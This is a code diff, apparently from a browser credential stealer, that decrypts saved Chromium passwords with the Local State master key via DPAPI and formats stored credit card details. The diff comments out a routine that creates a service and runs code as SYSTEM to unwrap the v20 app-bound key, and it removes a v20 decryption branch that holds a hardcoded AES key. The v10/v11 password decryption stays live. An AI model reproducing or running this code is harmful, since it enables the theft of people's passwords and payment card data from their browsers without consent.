@@ -100,12 +100,6 @@ class Types:
             return f"Name On Card: {self.name}\nCard Number: {self.number}\nExpires On: {self.exp_mth} / {self.exp_year}\nAdded On: {datetime.fromtimestamp(self.added_date)}"
 
 def get_keys(path: str) -> tuple[bytes, bytes]:
-    arguments = "-c \"" + """import win32crypt
-import binascii
-encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
-print(binascii.b2a_base64(encrypted_key[1]).decode())
-""".replace("\n", ";") + "\""
-
     local_state_path = join(path, "Local State")
     if not exists(local_state_path):
         return None
@@ -118,29 +112,36 @@ print(binascii.b2a_base64(encrypted_key[1]).decode())
         master_key = CryptUnprotectData(master_key, Flags=0)[1]
     except Exception as e: Log(f"{path} Local State (V10/V11) ---> {e}")
 
-    sys_client = Client("localhost")
-    try:
-        appb_key = b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
-        if appb_key[:4] != b"APPB": raise Exception("Invalid V20 key")
+    #     arguments = "-c \"" + """import win32crypt
+    # import binascii
+    # encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+    # print(binascii.b2a_base64(encrypted_key[1]).decode())
+    # """.replace("\n", ";") + "\""
+    # sys_client = Client("localhost")
+    # try:
+    #     appb_key = b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
+    #     if appb_key[:4] != b"APPB": raise Exception("Invalid V20 key")
 
-        sys_client.connect(timeout=10)
-        sys_client.create_service()
+    #     sys_client.connect(timeout=10)
+    #     sys_client.create_service()
 
-        encrypted_key_b64, stderr, rc = sys_client.run_executable(
-            executable=executable,
-            arguments=arguments.format(appb_key[4:].strip()),
-            use_system_account=True
-        )
+    #     encrypted_key_b64, stderr, rc = sys_client.run_executable(
+    #         executable=executable,
+    #         arguments=arguments.format(appb_key[4:].strip()),
+    #         use_system_account=True
+    #     )
 
-        appb_key = CryptUnprotectData(encrypted_key_b64.decode(), Flags=0)[1][-61:]
-        if appb_key[0] != 1: raise Exception("Decrypt failed")
-        return appb_key
+    #     appb_key = CryptUnprotectData(encrypted_key_b64.decode(), Flags=0)[1][-61:]
+    #     if appb_key[0] != 1: raise Exception("Decrypt failed")
+    #     return appb_key
         
-    except Exception as e: Log(f"{path} Local State (V20) ---> {e}")
-    finally:
-        sys_client.remove_service()
-        sys_client.cleanup()
-        sys_client.disconnect()
+    # except Exception as e: Log(f"{path} Local State (V20) ---> {e}")
+    # finally:
+    #     sys_client.remove_service()
+    #     sys_client.cleanup()
+    #     sys_client.disconnect()
+
+    return master_key, None
 
 
 def decrypt_password(buff: bytes, master_key: bytes, appbound_key: bytes) -> str:
@@ -151,11 +152,7 @@ def decrypt_password(buff: bytes, master_key: bytes, appbound_key: bytes) -> str
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         decrypted_pass = cipher.decrypt_and_verify(payload, tag)
         return decrypted_pass.decode("utf-8")
-    elif buff[:3] == b"v20":
-        aes_key = a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
-        iv = decrypted_key[1:1+12]
-        ciphertext = decrypted_key[1+12:1+12+32]
-        tag = decrypted_key[1+12+32:]
+    # elif buff[:3] == b"v20":
 
 def get_login_data(path, master_key, blink = False):
     try:
